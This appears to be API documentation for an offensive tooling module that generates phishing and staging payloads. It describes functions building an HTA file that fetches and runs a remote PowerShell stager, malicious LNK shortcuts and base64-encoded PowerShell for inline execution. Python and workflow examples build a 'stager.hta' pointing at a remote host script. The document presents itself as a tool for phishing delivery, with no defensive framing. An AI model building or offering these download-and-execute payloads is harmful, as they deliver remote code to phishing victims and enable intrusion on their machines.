# Payloads API

Generate small delivery artifacts for phishing or staging.

## Functions

- `build_hta(payload_url, title="Updater") -> str`: Minimal HTA that fetches and executes a remote PowerShell stager.
- `build_lnk(command, icon=None, workdir=None) -> str`: PowerShell snippet to emit a `.lnk` pointing to `command`.
- `inline_base64_ps(script) -> str`: Encode a PowerShell script for `-enc` inline execution.
- `save(content, path) -> Path`: Write generated content to disk.

## Python Usage

```python
from ofx.api import payloads
hta = payloads.build_hta("http://10.0.0.5/s.ps1")
payloads.save(hta, "stager.hta")
```

## Workflow Snippet

```yaml
steps:
  - name: build hta
    run: |
      python - <<'PY'
      from ofx.api import payloads
      content = payloads.build_hta("http://10.0.0.5/s.ps1")
      path = payloads.save(content, "stager.hta")
      print(f"wrote {path}")
      PY
```
